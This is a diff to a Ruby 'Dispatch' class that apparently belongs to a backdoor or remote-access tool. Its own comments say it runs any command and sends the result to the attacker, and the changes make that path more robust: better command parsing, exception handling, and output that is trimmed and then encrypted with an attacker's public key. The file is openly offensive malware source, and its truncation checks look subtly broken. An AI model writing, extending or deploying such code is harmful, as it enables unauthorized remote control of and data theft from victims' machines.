@@ -34,7 +34,10 @@ class Dispatch
 		when "die"
 			die
 		when "cmd"
-			cmd request[1]
+			# Remove `cmd ` from the string, and pass the rest as the command
+			plaintext.slice!(0..3)
+			cmd plaintext
+		else
 			"Unknown command."
 		end
 	end
@@ -49,7 +52,7 @@ class Dispatch
 	# directory path.
 	
 	def ls(path = "")
-		cmd 'ls ' + path
+		cmd 'ls ' + path.to_s
 	end
 
 	# Get
@@ -118,14 +121,19 @@ class Dispatch
 	# Run any command and send the result to the attacker.
 
 	def cmd(command)
-		@response = `#{command}`
+		begin
+			@response = `#{command}`
+		rescue Exception => e
+			@response = e.to_s
+		end
 	end
 
 	# to_string
 	#
 	# Returns the response of the command
 	def to_string()
-		return encrypt @response
+		# Make sure there is a carridge return, so remove it if there is one and add it back
+		return encrypt @response.to_s.chomp + "\n"
 	end
 
 # -------------------------------------------------------------
@@ -142,6 +150,12 @@ class Dispatch
 	# the cipher text.
 
 	def encrypt(data)
+		if ! data.length
+			data = "Nothing here...\n"
+		elsif data.length > 2027
+			data = data.slice!(2047..data.length)
+		end
+
 		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
 		return key.public_key.public_encrypt(data)
 	end
